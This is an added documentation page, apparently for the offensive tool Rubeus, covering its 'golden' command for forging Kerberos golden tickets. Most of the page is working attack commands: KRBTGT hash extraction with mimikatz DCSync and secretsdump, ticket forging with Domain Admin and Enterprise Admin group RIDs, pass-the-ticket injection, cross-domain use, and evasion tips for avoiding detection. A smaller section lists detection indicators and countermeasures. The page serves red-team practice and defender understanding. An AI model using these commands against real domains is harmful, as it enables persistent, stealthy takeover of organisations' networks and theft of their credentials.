@@ -1,0 +1,765 @@
+---
+title: 'golden'
+description: 'Forge golden tickets for domain persistence and privilege escalation'
+icon: 'crown'
+sidebarTitle: 'golden'
+---
+
+<Info>
+**Golden Ticket** attacks represent the pinnacle of Active Directory persistence, providing domain-wide access that persists even after password changes and system reboots.
+</Info>
+
+## Overview
+
+Golden tickets are forged Ticket Granting Tickets (TGTs) created using the KRBTGT account's password hash. These tickets provide persistent, high-privilege access to Active Directory environments by appearing completely legitimate to domain controllers.
+
+<CardGroup cols={3}>
+  <Card title="Domain Persistence" icon="clock">
+    Maintain access even after credential rotations
+  </Card>
+  <Card title="Full Privileges" icon="crown">
+    Domain Admin level access across the environment
+  </Card>
+  <Card title="Stealth Operations" icon="user-secret">
+    Tickets appear legitimate to security controls
+  </Card>
+</CardGroup>
+
+## Attack Prerequisites
+
+<Steps>
+  <Step title="Obtain KRBTGT Hash">
+    Extract the KRBTGT account password hash through DCSync or other methods
+  </Step>
+  <Step title="Domain Information">
+    Gather domain SID, domain name, and target user information
+  </Step>
+  <Step title="Ticket Creation">
+    Forge the golden ticket with desired privileges and validity
+  </Step>
+  <Step title="Ticket Injection">
+    Apply the forged ticket to gain domain-wide access
+  </Step>
+</Steps>
+
+## Syntax Variations
+
+<Tabs>
+  <Tab title="Manual Mode">
+    <CodeGroup>
+    ```bash Basic Golden Ticket
+    # Manual specification of all parameters
+    Rubeus.exe golden /user:admin /domain:corp.local /sid:S-1-5-21-123456789-987654321-111111111 /rc4:krbtgt_hash
+    ```
+
+    ```bash Advanced Configuration
+    # Custom groups and timing
+    Rubeus.exe golden /user:admin /domain:corp.local /sid:S-1-5-21-123456789-987654321-111111111 /aes256:krbtgt_hash /groups:512,513,518,519 /endtime:"12/31/2025 23:59:59"
+    ```
+
+    ```bash Stealth Ticket
+    # Realistic user with limited groups
+    Rubeus.exe golden /user:normaluser /domain:corp.local /sid:S-1-5-21-123456789-987654321-111111111 /aes256:krbtgt_hash /groups:513 /id:1001
+    ```
+    </CodeGroup>
+  </Tab>
+
+  <Tab title="LDAP Mode">
+    <CodeGroup>
+    ```bash Automatic LDAP Discovery
+    # Let Rubeus gather domain information automatically
+    Rubeus.exe golden /user:admin /rc4:krbtgt_hash /ldap
+    ```
+
+    ```bash LDAP with Overrides
+    # LDAP discovery with manual overrides
+    Rubeus.exe golden /user:admin /aes256:krbtgt_hash /ldap /groups:512,519 /endtime:"06/01/2025 12:00:00"
+    ```
+
+    ```bash Specific Domain Controller
+    # Target specific DC for LDAP queries
+    Rubeus.exe golden /user:admin /rc4:krbtgt_hash /ldap /dc:dc01.corp.local
+    ```
+    </CodeGroup>
+  </Tab>
+
+  <Tab title="Output & Injection">
+    <CodeGroup>
+    ```bash Save and Inject
+    # Create ticket and apply immediately
+    Rubeus.exe golden /user:admin /domain:corp.local /sid:domain_sid /rc4:krbtgt_hash /ptt
+    ```
+
+    ```bash File Output
+    # Save ticket for later use
+    Rubeus.exe golden /user:admin /domain:corp.local /sid:domain_sid /aes256:krbtgt_hash /outfile:golden.kirbi
+    ```
+
+    ```bash Command Generation
+    # Generate command for execution
+    Rubeus.exe golden /user:admin /rc4:krbtgt_hash /ldap /printcmd
+    ```
+    </CodeGroup>
+  </Tab>
+</Tabs>
+
+## Required Parameters
+
+<ParamField path="user" type="string" required>
+  Username for the forged ticket
+  <Expandable title="Username Options">
+    - **Real Users**: Use existing domain accounts for stealth
+    - **Fake Users**: Create non-existent users (still works)
+    - **Administrative**: Target high-privilege account names
+    - **Service Accounts**: Impersonate service accounts
+  </Expandable>
+</ParamField>
+
+## KRBTGT Authentication
+
+<Expandable title="Hash Types" icon="hashtag" defaultOpen>
+  <ParamField path="des" type="string">
+    DES-CBC-MD5 hash (legacy, not recommended)
+  </ParamField>
+
+  <ParamField path="rc4" type="string">
+    RC4-HMAC hash (NTLM format)
+    <Tooltip tip="Most commonly obtained hash type from DCSync attacks">
+      Format: 32-character hexadecimal string
+    </Tooltip>
+  </ParamField>
+
+  <ParamField path="aes128" type="string">
+    AES128-CTS-HMAC-SHA1-96 key
+    <Tooltip tip="Provides stronger encryption than RC4">
+      Preferred for environments with AES encryption
+    </Tooltip>
+  </ParamField>
+
+  <ParamField path="aes256" type="string">
+    AES256-CTS-HMAC-SHA1-96 key (recommended)
+    <Tooltip tip="Strongest encryption option available">
+      Best choice for stealth and modern environments
+    </Tooltip>
+  </ParamField>
+</Expandable>
+
+## Domain Information
+
+<Expandable title="Manual Configuration" icon="cog">
+  <ParamField path="domain" type="string">
+    Target domain name (FQDN format)
+    <Tooltip tip="Example: corp.local">
+      Use fully qualified domain name
+    </Tooltip>
+  </ParamField>
+
+  <ParamField path="sid" type="string">
+    Domain Security Identifier
+    <Expandable title="SID Discovery Methods">
+      ```bash
+      # PowerShell method
+      Get-ADDomain | Select-Object DomainSID
+
+      # Using whoami
+      whoami /user
+
+      # Using wmic
+      wmic useraccount where name='Administrator' get sid
+      ```
+    </Expandable>
+  </ParamField>
+
+  <ParamField path="netbios" type="string">
+    NetBIOS domain name (optional)
+    <Tooltip tip="Usually the short domain name (e.g., CORP)">
+      Default: derived from domain parameter
+    </Tooltip>
+  </ParamField>
+</Expandable>
+
+<Expandable title="LDAP Automatic Discovery" icon="search">
+  <ParamField path="ldap" type="boolean">
+    Automatically gather domain information via LDAP
+    <Tooltip tip="Retrieves domain SID, groups, and other required information">
+      Recommended for ease of use
+    </Tooltip>
+  </ParamField>
+
+  <ParamField path="dc" type="string">
+    Specific domain controller for LDAP queries
+  </ParamField>
+</Expandable>
+
+## Ticket Customization
+
+<Expandable title="User Identity" icon="user">
+  <ParamField path="id" type="number">
+    User ID (RID) for the ticket
+    <Tooltip tip="Default: 500 (Administrator RID)">
+      Common values: 500 (Admin), 1000+ (Regular users)
+    </Tooltip>
+  </ParamField>
+
+  <ParamField path="displayname" type="string">
+    Full display name for the user
+  </ParamField>
+
+  <ParamField path="groups" type="string">
+    Comma-separated list of group RIDs
+    <Expandable title="Common Group RIDs">
+      - **512**: Domain Admins
+      - **513**: Domain Users
+      - **518**: Schema Admins
+      - **519**: Enterprise Admins
+      - **520**: Group Policy Creator Owners
+    </Expandable>
+  </ParamField>
+
+  <ParamField path="pgid" type="number">
+    Primary Group ID (default: 513 - Domain Users)
+  </ParamField>
+</Expandable>
+
+<Expandable title="Timing Configuration" icon="clock">
+  <ParamField path="authtime" type="string">
+    Authentication time (default: now)
+    <Tooltip tip="Format: MM/DD/YYYY HH:MM:SS">
+      When the ticket was supposedly issued
+    </Tooltip>
+  </ParamField>
+
+  <ParamField path="starttime" type="string">
+    Ticket start time (default: now)
+  </ParamField>
+
+  <ParamField path="endtime" type="string">
+    Ticket expiration time
+    <Tooltip tip="Default: 10 years from now">
+      Format: MM/DD/YYYY HH:MM:SS
+    </Tooltip>
+  </ParamField>
+
+  <ParamField path="renewtill" type="string">
+    Renewable until time (default: 10 years)
+  </ParamField>
+</Expandable>
+
+<Expandable title="Advanced Options" icon="cog">
+  <ParamField path="flags" type="string">
+    Ticket flags (default: 0x40e10000)
+    <Expandable title="Common Flags">
+      - `0x40e10000` - Standard forwardable, renewable ticket
+      - `0x60a10000` - Include name canonicalize
+      - `0x40a50000` - Delegation-capable ticket
+    </Expandable>
+  </ParamField>
+
+  <ParamField path="uac" type="string">
+    User Account Control flags
+  </ParamField>
+
+  <ParamField path="sids" type="string">
+    Additional SIDs to include
+  </ParamField>
+
+  <ParamField path="oldpac" type="boolean">
+    Use legacy PAC format for compatibility
+  </ParamField>
+</Expandable>
+
+## Output Options
+
+<Expandable title="Ticket Output" icon="file-export">
+  <ParamField path="outfile" type="string">
+    Save forged ticket to file (.kirbi format)
+  </ParamField>
+
+  <ParamField path="ptt" type="boolean">
+    Pass-the-ticket: inject forged ticket immediately
+    <Tooltip tip="Applies the golden ticket to your current session">
+      Enables immediate use of forged credentials
+    </Tooltip>
+  </ParamField>
+
+  <ParamField path="printcmd" type="boolean">
+    Print command line for ticket creation
+    <Tooltip tip="Useful for saving commands for later execution">
+      Generates reusable command syntax
+    </Tooltip>
+  </ParamField>
+</Expandable>
+
+## Response Format
+
+<Tabs>
+  <Tab title="Successful Creation">
+    ```bash
+    [*] Action: Build TGT
+
+    [*] Building PAC
+
+    [*] Domain         : CORP.LOCAL (CORP)
+    [*] SID            : S-1-5-21-1234567890-987654321-111111111
+    [*] UserId         : 500
+    [*] Groups         : 512,513,518,519,520
+    [*] ServiceKey     : aes256_key_here
+    [*] ServiceKeyType : aes256_cts_hmac_sha1
+    [*] KDCKey         : aes256_key_here
+    [*] KDCKeyType     : aes256_cts_hmac_sha1
+    [*] Service        : krbtgt
+    [*] Target         : CORP.LOCAL
+
+    [*] Generating EncTicketPart
+    [*] Signing PAC
+    [*] Encrypting EncTicketPart
+    [*] Generating Ticket
+    [*] Generated KERB-CRED
+    [*] Forged a TGT for 'admin@CORP.LOCAL'
+
+    [*] AuthTime       : 10/25/2024 1:23:45 PM
+    [*] StartTime      : 10/25/2024 1:23:45 PM
+    [*] EndTime        : 10/25/2034 1:23:45 PM
+    [*] RenewTill      : 10/25/2034 1:23:45 PM
+
+    [*] base64(ticket.kirbi):
+          doIFujCCBbagAwIBBaEDAgEWooIEujCCBLahggS2MIIEsqADAgEFoQwbCkNPUlAuTE9D
+          QUyhHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCmNvcnAubG9jYWyjggR9MIIEeaADAgESoQMC
+          AQKiggRrBIIEZ2P+9l3v9...
+    ```
+
+    <ResponseField name="PAC Information" type="object">
+      Details about the Privilege Attribute Certificate
+      <Expandable title="PAC Fields">
+        - **Domain**: Target domain and NetBIOS name
+        - **SID**: Domain Security Identifier
+        - **UserId**: User RID in the ticket
+        - **Groups**: Group memberships granted
+      </Expandable>
+    </ResponseField>
+
+    <ResponseField name="Encryption Details" type="object">
+      Cryptographic information about the ticket
+      <Expandable title="Encryption Fields">
+        - **ServiceKey**: KRBTGT key used for signing
+        - **ServiceKeyType**: Encryption algorithm used
+        - **KDCKey**: Key Distribution Center key
+      </Expandable>
+    </ResponseField>
+
+    <ResponseField name="Ticket Timing" type="object">
+      Validity periods for the forged ticket
+      <Expandable title="Time Fields">
+        - **AuthTime**: When authentication occurred
+        - **StartTime**: When ticket becomes valid
+        - **EndTime**: When ticket expires
+        - **RenewTill**: Latest renewal time
+      </Expandable>
+    </ResponseField>
+
+    <ResponseField name="Base64 Ticket" type="string">
+      The forged TGT in base64 format for use or storage
+    </ResponseField>
+  </Tab>
+
+  <Tab title="LDAP Discovery">
+    ```bash
+    [*] Action: Build TGT
+
+    [*] Using LDAP to retrieve information for CORP.LOCAL
+
+    [*] Searching path 'LDAP://DC=corp,DC=local' for '(objectClass=domain)'
+    [*] Found domain object: DC=corp,DC=local
+    [*] Domain SID: S-1-5-21-1234567890-987654321-111111111
+
+    [*] Searching for target user 'admin'
+    [*] Found user object: CN=Administrator,CN=Users,DC=corp,DC=local
+    [*] User SID: S-1-5-21-1234567890-987654321-111111111-500
+
+    [*] Building PAC
+    [*] Domain         : CORP.LOCAL (CORP)
+    [*] SID            : S-1-5-21-1234567890-987654321-111111111
+    [*] UserId         : 500
+    [*] Groups         : 512,513,518,519,520
+    ```
+
+    <Info>
+      LDAP mode automatically discovers domain information, making golden ticket creation much easier by eliminating the need to manually specify domain SID and other parameters.
+    </Info>
+  </Tab>
+
+  <Tab title="Error Scenarios">
+    ```bash
+    [!] Invalid KRBTGT hash format!
+    [!] Please provide a valid RC4, AES128, or AES256 hash.
+
+    [!] Unable to connect to domain controller for LDAP queries.
+    [!] Please check network connectivity and domain name.
+
+    [!] Insufficient privileges for LDAP queries.
+    [!] Consider using manual mode with /domain and /sid parameters.
+    ```
+
+    <Warning>
+      Common error scenarios:
+      - **Invalid hash format**: KRBTGT hash must be valid hex string
+      - **Network issues**: LDAP mode requires DC connectivity
+      - **Permissions**: LDAP queries need authenticated domain access
+      - **Invalid SID**: Manual mode requires correct domain SID format
+    </Warning>
+  </Tab>
+</Tabs>
+
+## Complete Attack Workflow
+
+<Steps>
+  <Step title="Obtain KRBTGT Hash">
+    Extract KRBTGT credentials using DCSync or other methods:
+
+    ```bash
+    # Using Mimikatz
+    mimikatz.exe "lsadump::dcsync /user:krbtgt"
+
+    # Using Impacket
+    secretsdump.py domain/user:password@dc01.corp.local
+
+    # Using Rubeus with delegation
+    Rubeus.exe dump /service:krbtgt /nowrap
+    ```
+  </Step>
+
+  <Step title="Domain Information Gathering">
+    Collect required domain information (if not using LDAP mode):
+
+    ```bash
+    # Get domain SID
+    Get-ADDomain | Select-Object DomainSID
+
+    # Alternative method
+    whoami /user
+    ```
+  </Step>
+
+  <Step title="Golden Ticket Creation">
+    Create the forged TGT with appropriate parameters:
+
+    ```bash
+    # LDAP mode (recommended)
+    Rubeus.exe golden /user:admin /rc4:krbtgt_ntlm_hash /ldap /ptt
+
+    # Manual mode
+    Rubeus.exe golden /user:admin /domain:corp.local /sid:S-1-5-21... /rc4:krbtgt_hash /ptt
+    ```
+  </Step>
+
+  <Step title="Verification and Usage">
+    Verify the ticket was created and test access:
+
+    ```bash
+    # List current tickets
+    Rubeus.exe klist
+
+    # Test domain controller access
+    dir \\dc01.corp.local\c$
+
+    # Request service tickets
+    Rubeus.exe asktgs /service:cifs/fileserver.corp.local
+    ```
+  </Step>
+
+  <Step title="Persistence Operations">
+    Use the golden ticket for persistent access:
+
+    ```bash
+    # Save ticket for later use
+    Rubeus.exe golden /user:admin /rc4:krbtgt_hash /ldap /outfile:golden.kirbi
+
+    # Create additional tickets as needed
+    Rubeus.exe golden /user:serviceaccount /rc4:krbtgt_hash /ldap /groups:513,1001
+    ```
+  </Step>
+</Steps>
+
+## Advanced Usage Scenarios
+
+<Tabs>
+  <Tab title="Stealth Operations">
+    <Expandable title="Realistic User Simulation" defaultOpen>
+      ```bash
+      # Create ticket for existing user with normal privileges
+      Rubeus.exe golden /user:john.doe /rc4:krbtgt_hash /ldap /groups:513 /id:1001
+
+      # Gradually escalate with additional tickets
+      Rubeus.exe golden /user:john.doe /rc4:krbtgt_hash /ldap /groups:513,1001,1002
+      ```
+    </Expandable>
+
+    <Expandable title="Time-Based Evasion">
+      ```bash
+      # Create ticket with realistic timing
+      Rubeus.exe golden /user:admin /rc4:krbtgt_hash /ldap /authtime:"10/25/2024 09:00:00" /endtime:"10/25/2024 17:00:00"
+
+      # Short-lived ticket for specific operations
+      Rubeus.exe golden /user:admin /rc4:krbtgt_hash /ldap /endtime:"10/25/2024 23:59:59"
+      ```
+    </Expandable>
+
+    <Expandable title="Service Account Impersonation">
+      ```bash
+      # Impersonate service accounts
+      Rubeus.exe golden /user:svc_sql /rc4:krbtgt_hash /ldap /groups:513 /id:1100
+
+      # Machine account impersonation
+      Rubeus.exe golden /user:COMPUTER$ /rc4:krbtgt_hash /ldap /groups:515
+      ```
+    </Expandable>
+  </Tab>
+
+  <Tab title="Cross-Domain Operations">
+    <Expandable title="Child Domain Access" defaultOpen>
+      ```bash
+      # Target child domain
+      Rubeus.exe golden /user:admin /domain:child.corp.local /rc4:krbtgt_hash /ldap
+
+      # Use parent domain KRBTGT for child access
+      Rubeus.exe golden /user:admin /domain:child.corp.local /sid:child_domain_sid /rc4:parent_krbtgt_hash
+      ```
+    </Expandable>
+
+    <Expandable title="Trust Relationships">
+      ```bash
+      # Cross-forest trust exploitation
+      Rubeus.exe golden /user:admin /domain:partner.com /sid:partner_domain_sid /rc4:trust_key
+
+      # Enterprise Admin across forest
+      Rubeus.exe golden /user:admin /domain:corp.local /rc4:krbtgt_hash /groups:519 /ldap
+      ```
+    </Expandable>
+  </Tab>
+
+  <Tab title="Bulk Operations">
+    <Expandable title="Multiple User Tickets" defaultOpen>
+      ```bash
+      # Create tickets for multiple users
+      Rubeus.exe golden /user:admin /rc4:krbtgt_hash /ldap /outfile:admin.kirbi
+      Rubeus.exe golden /user:backup_admin /rc4:krbtgt_hash /ldap /outfile:backup.kirbi
+      Rubeus.exe golden /user:service_admin /rc4:krbtgt_hash /ldap /outfile:service.kirbi
+      ```
+    </Expandable>
+
+    <Expandable title="Different Privilege Levels">
+      ```bash
+      # Domain Admin level
+      Rubeus.exe golden /user:domain_admin /rc4:krbtgt_hash /ldap /groups:512,513,518,519,520
+
+      # Standard user level
+      Rubeus.exe golden /user:normal_user /rc4:krbtgt_hash /ldap /groups:513
+
+      # Service account level
+      Rubeus.exe golden /user:svc_account /rc4:krbtgt_hash /ldap /groups:513,1001,1002
+      ```
+    </Expandable>
+  </Tab>
+</Tabs>
+
+## OPSEC Considerations
+
+<Warning>
+**High-Impact Attack**: Golden tickets provide complete domain access and can be detected through various monitoring techniques.
+</Warning>
+
+<Tabs>
+  <Tab title="Detection Vectors">
+    <Expandable title="Ticket Analysis" defaultOpen>
+      **Unusual Ticket Characteristics:**
+      - Tickets with 10-year validity periods
+      - Non-existent usernames in tickets
+      - Tickets created outside normal hours
+      - Unusual group memberships or privileges
+
+      **Behavioral Indicators:**
+      - Authentication without prior logon events
+      - Access to resources without service ticket requests
+      - Privileged operations from low-privilege accounts
+    </Expandable>
+
+    <Expandable title="Event Log Monitoring">
+      **Windows Event Logs:**
+      - **Event 4769**: Service ticket requests with unusual patterns
+      - **Event 4768**: TGT requests that don't correlate with golden ticket usage
+      - **Event 4624**: Logon events that may not occur with golden tickets
+      - **Event 4672**: Special privileges assigned without normal authentication
+    </Expandable>
+
+    <Expandable title="Network Monitoring">
+      - Kerberos traffic analysis for unusual patterns
+      - TGS requests without corresponding TGT requests
+      - Authentication to services without normal authentication flow
+      - Unusual timing patterns in authentication events
+    </Expandable>
+  </Tab>
+
+  <Tab title="Evasion Techniques">
+    <Expandable title="Realistic Ticket Parameters" defaultOpen>
+      ```bash
+      # Use realistic validity periods
+      Rubeus.exe golden /user:admin /rc4:krbtgt_hash /ldap /endtime:"12/31/2024 23:59:59"
+
+      # Use existing usernames
+      Rubeus.exe golden /user:existing_admin /rc4:krbtgt_hash /ldap
+
+      # Use standard group memberships
+      Rubeus.exe golden /user:admin /rc4:krbtgt_hash /ldap /groups:512,513
+      ```
+    </Expandable>
+
+    <Expandable title="Timing Considerations">
+      ```bash
+      # Create tickets during business hours
+      Rubeus.exe golden /user:admin /rc4:krbtgt_hash /ldap /authtime:"10/25/2024 10:30:00"
+
+      # Use realistic authentication times
+      Rubeus.exe golden /user:admin /rc4:krbtgt_hash /ldap /authtime:"10/25/2024 08:15:00" /starttime:"10/25/2024 08:15:00"
+      ```
+    </Expandable>
+
+    <Expandable title="Operational Patterns">
+      - Limit the number of golden tickets created
+      - Use different usernames for different operations
+      - Avoid obvious administrative actions immediately after ticket creation
+      - Blend with normal business activity patterns
+    </Expandable>
+  </Tab>
+
+  <Tab title="Defensive Countermeasures">
+    <Expandable title="KRBTGT Protection">
+      **Preventive Measures:**
+      - Regular KRBTGT password rotation (recommended: twice)
+      - Implement privileged access management (PAM)
+      - Monitor KRBTGT account access and changes
+      - Restrict DCSync permissions to necessary accounts only
+
+      **Detection Rules:**
+      - Monitor for DCSync operations against KRBTGT
+      - Alert on unusual KRBTGT password changes
+      - Track accounts with replication permissions
+    </Expandable>
+
+    <Expandable title="Ticket Monitoring">
+      **Advanced Detection:**
+      - Implement Kerberos ticket inspection
+      - Monitor for tickets with unusual characteristics
+      - Correlate authentication events with user behavior
+      - Use machine learning for authentication anomaly detection
+
+      **SIEM Rules:**
+      ```sql
+      -- Detect long-lived tickets
+      SELECT * FROM kerberos_events
+      WHERE ticket_lifetime > '1 day'
+      AND user NOT IN (service_accounts)
+
+      -- Detect unusual group memberships
+      SELECT * FROM kerberos_events
+      WHERE groups CONTAINS 'unusual_high_privilege_groups'
+      ```
+    </Expandable>
+  </Tab>
+</Tabs>
+
+## Troubleshooting
+
+<Expandable title="Common Issues" icon="exclamation-triangle">
+  <Tabs>
+    <Tab title="Hash Format Issues">
+      **Problem**: Invalid KRBTGT hash format errors
+
+      **Solutions**:
+      - Verify hash is exactly 32 characters for RC4
+      - Ensure AES keys are proper length (32 chars for AES128, 64 for AES256)
+      - Remove any spaces or line breaks from hash
+      - Verify hash was extracted correctly
+
+      ```bash
+      # Verify hash format
+      echo "hash_length: ${#krbtgt_hash}"
+
+      # Test with RC4 hash
+      Rubeus.exe golden /user:test /rc4:32ed87bdb5fdc5e9cba88547376818d4 /domain:corp.local /sid:S-1-5-21...
+      ```
+    </Tab>
+
+    <Tab title="LDAP Connectivity">
+      **Problem**: LDAP queries failing in automatic mode
+
+      **Solutions**:
+      - Verify domain controller connectivity
+      - Check DNS resolution for domain name
+      - Ensure current user has domain authentication
+      - Try manual mode if LDAP fails
+
+      ```bash
+      # Test LDAP connectivity
+      nslookup corp.local
+
+      # Use manual mode as fallback
+      Rubeus.exe golden /user:admin /domain:corp.local /sid:S-1-5-21... /rc4:krbtgt_hash
+      ```
+    </Tab>
+
+    <Tab title="Access Issues">
+      **Problem**: Forged ticket doesn't provide expected access
+
+      **Solutions**:
+      - Verify ticket was injected successfully
+      - Check group memberships in ticket
+      - Ensure target services are accessible
+      - Verify KRBTGT hash is current
+
+      ```bash
+      # Verify ticket injection
+      Rubeus.exe klist
+
+      # Test with different groups
+      Rubeus.exe golden /user:admin /rc4:krbtgt_hash /ldap /groups:512,513,518,519,520
+
+      # Describe ticket contents
+      Rubeus.exe describe /ticket:golden.kirbi
+      ```
+    </Tab>
+  </Tabs>
+</Expandable>
+
+## Integration with Other Attacks
+
+<CardGroup cols={2}>
+  <Card title="DCSync Integration" icon="download">
+    Use DCSync to obtain KRBTGT hash for golden ticket creation
+  </Card>
+  <Card title="Lateral Movement" icon="arrows-left-right">
+    Use golden tickets to access remote systems and services
+  </Card>
+  <Card title="Persistence Chains" icon="link">
+    Combine with other persistence techniques for redundant access
+  </Card>
+  <Card title="Privilege Escalation" icon="arrow-up">
+    Escalate from limited access to domain administrator privileges
+  </Card>
+</CardGroup>
+
+## Related Commands
+
+<CardGroup cols={2}>
+  <Card title="silver" icon="medal" href="/ghostpack-docs/Rubeus-mdx/commands/forgery/silver">
+    Create service-specific forged tickets
+  </Card>
+  <Card title="diamond" icon="gem" href="/ghostpack-docs/Rubeus-mdx/commands/forgery/diamond">
+    Create hybrid legitimate/forged tickets
+  </Card>
+  <Card title="ptt" icon="arrow-right" href="/ghostpack-docs/Rubeus-mdx/commands/management/ptt">
+    Inject golden tickets into sessions
+  </Card>
+  <Card title="describe" icon="magnifying-glass" href="/ghostpack-docs/Rubeus-mdx/commands/management/describe">
+    Analyze golden ticket structure
+  </Card>
+</CardGroup>
